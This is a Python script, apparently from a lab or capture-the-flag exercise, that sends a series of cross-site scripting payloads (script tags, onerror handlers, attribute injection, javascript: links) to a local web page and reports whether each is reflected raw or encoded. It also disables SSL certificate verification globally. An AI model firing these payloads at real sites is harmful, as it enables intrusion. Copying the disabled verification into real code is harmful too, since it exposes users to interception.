import urllib.request
import urllib.parse
import ssl
import html

# Disable SSL verification for testing
ssl._create_default_https_context = ssl._create_unverified_context

def test_payload(payload, name):
    print(f"\n{'='*70}")
    print(f"Testing {name}: {payload}")
    print('='*70)
    
    try:
        # URL encode the payload
        encoded = urllib.parse.quote(payload, safe='')
        url = f"http://127.0.0.1:33081/page?name={encoded}"
        
        print(f"Request URL: {url}")
        
        # Make request with timeout
        with urllib.request.urlopen(url, timeout=30) as response:
            data = response.read().decode('utf-8')
            
            # Check if payload reflects
            if payload in data:
                print("✓ Payload found in response (RAW)")
                idx = data.find(payload)
                context = data[max(0, idx-100):idx+len(payload)+100]
                print(f"Context:\n{context}")
            else:
                # Check for HTML encoded version
                escaped = html.escape(payload)
                if escaped in data:
                    print("✓ Payload found (HTML ENCODED)")
                    idx = data.find(escaped)
                    context = data[max(0, idx-100):idx+len(escaped)+100]
                    print(f"Context:\n{context}")
                else:
                    print("✗ Payload NOT found (filtered/removed)")
                    
            # Show first 500 chars of response
            print(f"\nResponse preview (first 500 chars):\n{data[:500]}")
            
    except Exception as e:
        print(f"ERROR: {e}")

# Test cases
print("XSS CONTEXT ANALYSIS - Testing payload reflection")
print("Target: http://127.0.0.1:33081/page?name=PAYLOAD")

test_payload("Test123", "Plain Text")
test_payload("<b>BOLD</b>", "HTML Tag")
test_payload("<script>alert(1)</script>", "Script Tag")
test_payload('<img src=x onerror=alert(1)>', "Event Handler")
test_payload('" onload=alert(1)>', "Attribute Injection")
test_payload('<a href="javascript:alert(1)">link</a>', "JS Protocol")
test_payload("<>\"'&", "Special Characters")
test_payload('<img src=x onError=alert("XSS")>', "Mixed XSS")
